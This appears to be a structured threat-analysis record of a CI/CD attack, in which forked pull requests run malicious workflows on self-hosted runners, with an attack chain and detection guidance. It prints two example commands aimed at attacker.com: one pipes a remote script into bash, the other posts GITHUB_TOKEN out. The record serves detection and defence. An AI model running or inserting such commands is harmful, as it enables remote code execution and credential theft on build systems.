package_info.package_versions: N/A (applies to any repository with self-hosted runners and default settings)
package_info.why_malicious: The entire workflow is malicious because it allows untrusted code from forked pull requests to execute on privileged self-hosted runners, enabling attackers to inject arbitrary code, persist access, and disrupt or compromise sensitive build environments.

malicious_snippets.code_snippet:
steps:
  - name: Malicious code execution
    run: |
      curl -fsSL http://attacker.com/payload.sh | bash
malicious_snippets.code_behavior: During CI/CD workflow execution triggered by a pull request from a fork, the code downloads and executes a remote shell script from an attacker-controlled server, enabling arbitrary code execution and potential persistence or exfiltration.

malice_analysis.why_suspicious: This behavior is suspicious because it allows untrusted contributors to execute arbitrary code on privileged infrastructure, which can lead to compromise of the build environment or exfiltration of secrets.
malice_analysis.violated_expectations: Normal workflows should only execute trusted, reviewed code. Allowing code from forked pull requests to run without approval on self-hosted runners violates the principle of least privilege and code review best practices.
malice_analysis.similar_legitimate_use: Legitimate workflows may download dependencies or tools, but only from trusted sources and after code review.
key_indicators: Execution of code from untrusted pull requests
No approval required for workflow execution

malicious_snippets.code_snippet:
steps:
  - name: Exfiltrate secrets
    run: |
      cat $GITHUB_TOKEN | curl -X POST -d @- http://attacker.com/secrets
malicious_snippets.code_behavior: During CI/CD workflow execution, the code reads sensitive environment variables (such as GITHUB_TOKEN) and exfiltrates their values to an attacker-controlled server via HTTP POST.

malice_analysis.why_suspicious: This behavior is suspicious because it attempts to steal sensitive credentials from the CI environment and send them to an external server.
malice_analysis.violated_expectations: Normal workflows should never exfiltrate secrets or credentials outside the organization.
malice_analysis.similar_legitimate_use: No legitimate use case for exfiltrating secrets to untrusted domains.
key_indicators: Sending data to external, untrusted domains

attack_chain.action: Attacker forks a target repository and submits a pull request containing a malicious workflow.
attack_chain.leads_to: Malicious workflow is queued for execution on self-hosted runner.

attack_chain.action: Malicious workflow executes on self-hosted runner without approval due to default settings.
attack_chain.leads_to: Arbitrary code execution on privileged infrastructure.

attack_chain.action: Malicious code exfiltrates secrets or persists access.
attack_chain.leads_to: Attacker gains access to sensitive data or control over build environment.

behavioral_signatures: CI/CD workflow execution triggered by forked pull requests on self-hosted runners
Workflows downloading and executing remote scripts from untrusted domains
Workflows accessing and exfiltrating environment variables or secrets
file_indicators: Workflows with steps that POST data to external domains
network_indicators: Outbound HTTP/HTTPS requests to non-whitelisted domains during workflow execution
POST requests containing environment variable data
detection_knowledge.how_to_detect: Monitor workflow files for steps that download and execute remote scripts or access secrets. Audit workflow triggers to ensure that workflows from forked pull requests do not run on self-hosted runners without approval. Monitor network traffic from CI/CD runners for connections to untrusted domains, especially during workflow execution. Alert on any workflow that attempts to exfiltrate environment variables or secrets.
